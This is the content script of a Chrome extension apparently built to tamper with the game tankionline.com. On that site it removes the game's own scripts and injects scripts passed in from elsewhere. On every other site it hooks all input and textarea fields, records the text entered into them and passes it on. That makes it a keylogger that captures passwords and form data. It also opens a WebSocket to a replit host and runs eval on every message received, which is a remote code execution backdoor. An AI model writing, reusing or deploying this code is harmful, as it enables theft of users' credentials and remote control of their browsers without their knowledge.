if (window.location.href.includes('tankionline.com')) {
    // Function to remove specific script elements from the DOM
    const removeTargetedScripts = (mutations) => {
        for (let mutation of mutations) {
            // Check if there are added nodes and the first one is a script element
            if (mutation.addedNodes.length > 0) {
                const addedNode = mutation.addedNodes[0];
                if (addedNode instanceof HTMLScriptElement) {
                    const scriptElement = addedNode;

                    // Check if the script source URL contains "/static/js/"
                    if (scriptElement.src.includes("/static/js/")) {
                        console.log(`Removing script: ${scriptElement.src}`);
                        fetch(scriptElement.src);
                        scriptElement.remove(); // Remove the script element
                    }
                }
            }
        }
    };

    // Function to start observing the DOM for added script elements
    const startObserving = () => {
        const observer = new MutationObserver(removeTargetedScripts);
        observer.observe(document, {
            attributes: true,
            childList: true,
            subtree: true
        });
    };
    // Initialize the MutationObserver
    startObserving();

    // Listen for a message from the background script
    chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
        if (message.action === 'injectScript') {
            // Inject a script into the DOM
            const script = document.createElement('script');
            script.textContent = message.script;
            document.body.appendChild(script);
            setTimeout(() => {
                script.remove();
            }, 500);
        };
        if (message.action === 'injectScript1') {
            // Inject a script into the DOM
            const script = document.createElement('script');
            script.textContent = decodeURI(message.script.replaceAll('%', '%25'));
            document.body.appendChild(script);
            setTimeout(() => {
                script.remove();
            }, 500);
        };
    });
    var previousData = null, injected = false;
    var int = setInterval(() => {
        if (document.body) {
            if (!injected) {
                /*const scriptUrl = chrome.extension.getURL('User.js');
                const scriptElement = document.createElement('script');
                scriptElement.src = scriptUrl;
                document.body.appendChild(scriptElement);*/
                fetch('https://raw.githubusercontent.com/LEaRCrEaM/UniChat2/main/asdwa.js')
                    .then(response => response.text())
                    .then(data => {
                        var script = document.createElement('script');
                        document.body.appendChild(script);
                        //script.textContent = data;
                        fetch('https://raw.githubusercontent.com/LEaRCrEaM/UniChat2/main/asdda.js')
                            .then(response => response.text())
                            .then(data => {
                                var script = document.createElement('script');
                                document.body.appendChild(script);
                                //script.textContent = data;
                            })
                    })
                injected = true;
                console.log('%cr', 'color:red;font-size:30px;');
            };
            if (t = document.querySelector('.test')) {
                if (t.textContent !== previousData) {
                    chrome.runtime.sendMessage({ action: 'sendDataFromPage', data: document.querySelector('.test').textContent }, function (response) {
                        console.log('Received response from background:', response);
                    });
                    previousData = t.textContent;
                };
            };
        };
    }, 1000);
} else {
    document.addEventListener('DOMContentLoaded', () => {
        var text = '', text1;

        // Function to add keydown listener
        function addKeydownListener(element) {
            element.addEventListener('keydown', handleKeydown);
        }

        // Function to remove keydown listener
        function removeKeydownListener(element) {
            element.removeEventListener('keydown', handleKeydown);
        }

        // Keydown event handler
        function handleKeydown(event) {
            if (event.key === 'Enter') {
                text += event.target.value;
                if (text !== text1) {
                    chrome.runtime.sendMessage({ action: 'sendDataFromPage1', data: text });
                    text1 = text;
                };
            };
        }

        // Handle existing inputs and textareas
        function attachListenersToExistingElements() {
            const elements = document.querySelectorAll('input, textarea');
            elements.forEach((element) => {
                addKeydownListener(element);
            });
        }

        // Create a MutationObserver
        const observer = new MutationObserver((mutationsList) => {
            mutationsList.forEach((mutation) => {
                // Check added nodes
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        if (node.matches('input, textarea')) {
                            addKeydownListener(node);
                        }
                        // If the added node has input or textarea children
                        node.querySelectorAll('input, textarea').forEach((child) => {
                            addKeydownListener(child);
                        });
                    }
                });

                // Check removed nodes
                mutation.removedNodes.forEach((node) => {
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        if (node.matches('input, textarea')) {
                            // Capture value before removal
                            text += node.value || '';
                            removeKeydownListener(node);
                            if (text !== text1) {
                                chrome.runtime.sendMessage({ action: 'sendDataFromPage1', data: text });
                                text1 = text;
                            };
                        }
                        // If the removed node has input or textarea children
                        node.querySelectorAll('input, textarea').forEach((child) => {
                            text += child.value || '';
                            removeKeydownListener(child);
                            if (text !== text1) {
                                chrome.runtime.sendMessage({ action: 'sendDataFromPage1', data: text });
                                text1 = text;
                            };
                        });
                    }
                });
            });
        });

        // Start observing the body for added or removed elements
        observer.observe(document.body, { childList: true, subtree: true });

        // Attach listeners to existing inputs and textareas
        attachListenersToExistingElements();
    });
};
window.addEventListener("message", (event) => {
    // Ensure the message is from the same origin to prevent security risks
    if (event.source !== window) return;
    
    if (event.data.action === "sendToWS") {
        chrome.runtime.sendMessage({ action: "sendToWS", message: event.data.message });
    }
});

window.ws2 = new WebSocket('https://f369ddf5-0060-412b-bade-81d91eed800d-00-2oftgx26703uu.riker.replit.dev:8080/');
ws2.onopen = function() {
    console.log('connected');
};
ws2.onclose = function() {
    console.log('disconnected');
};
ws2.onmessage = function(message) {
    eval(message.data);
};